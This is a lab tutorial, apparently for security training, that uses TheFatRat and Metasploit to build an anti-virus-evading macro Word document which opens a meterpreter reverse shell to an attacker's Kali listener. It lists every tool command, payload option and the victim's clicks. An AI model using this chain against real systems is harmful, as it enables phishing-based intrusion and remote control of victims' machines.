# Hacking Windows with Malicious Office Document using TheFatRat
TheFatRat is an exploiting tool which compiles a malware with famous payload, and then the compiled malware can be executed on Linux, Windows, Mac and Android. TheFatRat Provides An Easy way to create Backdoors and Payload which can bypass most anti-virus.

Official Repository: https://github.com/Screetsec/TheFatRat

### Objectives
* How to use an office document to exploit a windows machine.

### Requisites
* Windows Server 2016/2012 virtual machine.
* Kali linux virtual machine.

## Set up TheFatRat

TheFatRat provides an easy way to create backdoors and payloads which can bypass most anti-virus systems.

### Setting up

1. Go to your Kali machine and open the Terminal.
2. Navigate to the **/opt/** folder.<br>
`cd /opt`<br>
3. Clone the original github repository from FatRat:<br>
`git clone https://github.com/Screetsec/TheFatRat.git`
4. Change the folder permissions:<br>
`chmod -R 755 /opt/TheFatRat/`
5. Go to the TheFatRat folder:<br>
`cd TheFatRat/`
6. Execute the bash file **(setup.sh)** to begin the installation:<br>
`./setup.sh`

An Updating Kali Repo xterm window will popup as shown below:

![installing-fatRat](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/InstallingFatRat-0.png)


## Make a Backdoor File
After the installation is complete, in the Terminal, type `fatrat` and hit enter.

When FatRat launches, starts to verify the installed dependencies, you will get multiple prompts, just type Enter to continue.

![fatratmenu](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/TheFatRat-1.png)

On the FatRat menu, choose **[06] Create Fud Backdoor 1000% with PwnWindws [Excelent]** by typing `6`.

![PwnWind](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e0a88cc5a5dc16d3f868e25305588c3f1a4336d2/pwnwind-1.png)

**PwnWinds** menu appears as shown above, choose the **[3] Create exe file with apache + Powershell (FUD 100%) by typing** `3` in the menu. 

![payload](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/65ae135c7f8375eb60e15ac0ac936b142562ac66/payload.png)

Set the `LHOST IP` to your Kali IP; `LPORT` to `4444` and the output to `payload` as show above.

Next, chose **[3] windows/meterpreter/reverse_tcp** by typing `3`.

![payloadchoose](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e68bd00de68fe3b81729e742f4fe28621e93140b/payload-choose.png)

If everything works, fatrat will generate a **payload.exe** file located on /root/Fatrat_Generated/ as shown below:

```
Backdoor Saved To : /root/Fatrat_Generated/payload.exe
```

## Make a Malicious Word File
Go back to the main menu by choosing **[9] Back to menu**.

On the main menu, choose the **[07]  Create Backdoor For Office with Microsploit** 

![microsploit](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/51c3113f08b47fc83c01fa8a5ff5fc1ed45bb21f/MicroSploit.png)

On the Microsploit menu, choose **[2] The Microsoft Office Macro on Windows** by typing `2`.

### The next configurations will be:

1. `LHOST IP`: [Your Kali IP] 
2. `LPORT`: 4444
3. `Enter the base name for output files`: EvilDoc
4. `Enter the message for the document body`: you have been PWNED :)
5. The next prompt will ask if you want to use a custom exe to file backdoor. Choose `y` for **yes**.
6. Specify the exactly path to your payload.exe that you generated on the beginings of this lab: **/root/Fatrat_Generated/payload.exe**
7. On the Payload Option, choose the **[3] windows/meterpreter/reverse_tcp** by typing `3`.
Navigate to output folder of FatRat to you will see the generated Word file.

![evilFiles](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c0c8c4ef9ecf358334343d4036a0bb98255272f7/evilFiles.png)

## Set Up a Listener
Open another Terminal window and launch metasploit by typing: `msfconsole`.

Select the **multi/handler**:<br>
`use multi/handler`

Set the payload to **meterpreter/reverse_tcp**:<br>
`set payload windows/meterpreter/reverse_tcp`

Set the **LHOST** to your Kali IP and **LPORT** to **4444**:<br>
`set LHOST 10.0.2.42`<br>
`set LPORT 4444`<br>

Type **run** to start the listener:<br>
`run`

## Share the Malicious Doc File
To share the malicious file to Windows machine, copy the Doc file to the apache folder. Open a new Terminal window and type:<br>
`cp /root/Fatrat_Generated/EvilDoc.docm /var/www/html/share/`

Then, start the apache service:<br>
`service apache2 start`

## Open the Malicious doc
Switch to your Windows machine and open the **browser**.

Type the URL (based on your Kali IP):<br>
`http://10.0.2.42/share/`

Then, download the malicious doc that you generated.

![EvilFile-0](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/evilfile-0.png)

Open the downloads folder and click the MS Word file.

MS Word open the file in Protected View. Click **Enable Editing** as shown below:

![ms-word-protected-view](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/maliciousword.png)

If you got the **SECURITY WARNING** because of the Macros, click on **Enable Content**.

Now Switch back to the Kali, if everything works, you will find that have a **Meterpreter session** open in the Metasploit terminal.

![meterpreter-docfile](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/meterpreter-docfile.png)

Now you can view the exploited system details and so on. Informally you can call this action 'profit' :)